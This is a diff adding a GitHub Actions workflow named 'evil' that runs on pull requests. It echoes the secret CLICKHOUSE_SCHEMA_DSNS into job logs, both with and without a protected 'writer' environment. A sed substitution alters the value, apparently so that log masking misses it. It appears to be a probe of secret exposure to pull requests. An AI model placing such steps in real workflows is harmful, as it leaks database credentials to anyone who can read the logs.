@@ -1,0 +1,16 @@
+name: evil
+on: pull_request
+jobs:
+  no-env:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "evil no-env write=$W" | sed 's/-dsn-/-DSN-/'
+        env:
+          W: ${{ secrets.CLICKHOUSE_SCHEMA_DSNS }}
+  with-env:
+    runs-on: ubuntu-latest
+    environment: clickhouse-schemas - writer
+    steps:
+      - run: echo "evil with-env write=$W" | sed 's/-dsn-/-DSN-/'
+        env:
+          W: ${{ secrets.CLICKHOUSE_SCHEMA_DSNS }}
